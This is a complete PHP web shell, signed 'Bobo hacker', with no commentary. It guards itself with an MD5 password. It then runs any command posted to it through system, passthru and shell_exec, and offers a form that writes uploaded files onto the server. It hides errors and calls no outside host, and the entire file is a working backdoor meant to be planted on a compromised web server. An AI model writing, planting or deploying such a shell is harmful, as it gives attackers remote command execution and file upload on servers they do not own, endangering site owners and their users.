<HTML>
<title>Just For Fun</title>
<BODY>
<H3>Build By Bobo hacker</H3>
<?php
header("content-type:text/html;charset=GB2312");
$locale='en_US.UTF-8';
setlocale(LC_ALL,$locale);
putenv('LC_ALL='.$locale);
error_reporting(0);
$passwd="ca2cd2bcc63c4d7c8725577442073dde";
if(isset($_GET[bobo])){$bobo=$_GET[bobo];$_GET[bobo]=md5($_GET[bobo]);}
if(isset($_GET[bobo])&&$_GET[bobo]==$passwd&&(!isset($_POST[upload])&&!isset($_FILES['upload_file']))){
echo "CMD";
echo <<<EOT
<form name="form1" method="post" action="#">
<input type="text" name="a" size="20" >
<input name="submit" type="submit" id="submit" value="run" /></form>
EOT;
echo <<<EOT
<form name="form1" method="post" action="#">
<input type="hidden" name="upload" size="20" value="1" >
<input type="submit" value="go upload" /></form>
EOT;
if(isset($_POST[a])){system("$_POST[a]");echo "</br>"; passthru("$_POST[a]");echo "</br>";echo(shell_exec("$_POST[a]"));}
}
else{
if(isset($_GET[bobo])&&$_GET[bobo]==$passwd&&(isset($_POST[upload])||isset($_FILES['upload_file']))){
@$temp = $_FILES['upload_file']['tmp_name'];
@$file = basename($_FILES['upload_file']['name']);
if (empty ($file)){
echo "<form action = '' method = 'POST' ENCTYPE='multipart/form-data'>\n";echo "Local file: <input type = 'file' name = 'upload_file'>\n";echo "<input type = 'submit' value = 'Upload'>\n";echo "</form>\n<pre>\n\n</pre>";}else {if(move_uploaded_file($temp,$file)){echo "File uploaded successfully.<p>\n";}else {echo "Unable to upload " . $file . ".<p>\n";}echo "<form action = '' method = 'POST' ENCTYPE='multipart/form-data'>\n";echo "Local file: <input type = 'file' name = 'upload_file'>\n";echo "<input type = 'submit' value = 'Upload'>\n";echo "</form>\n<pre>\n\n</pre>";}
}
if(isset($_GET[bobo])&&$_GET[bobo]!=$passwd){
echo <<<EOT
<H5>Wrong Password!!!</H5>
<form name="form1" method="get" action="">
<input type="text" name="bobo" size="20" >
<input type="submit" value="passwd" /></form>
EOT;
}
if(!isset($_GET[bobo])){
echo "input password";
echo <<<EOT
<form name="form1" method="get" action="">
<input type="text" name="bobo" size="20" >
<input type="submit" value="passwd" /></form>
EOT;
}
}
?>
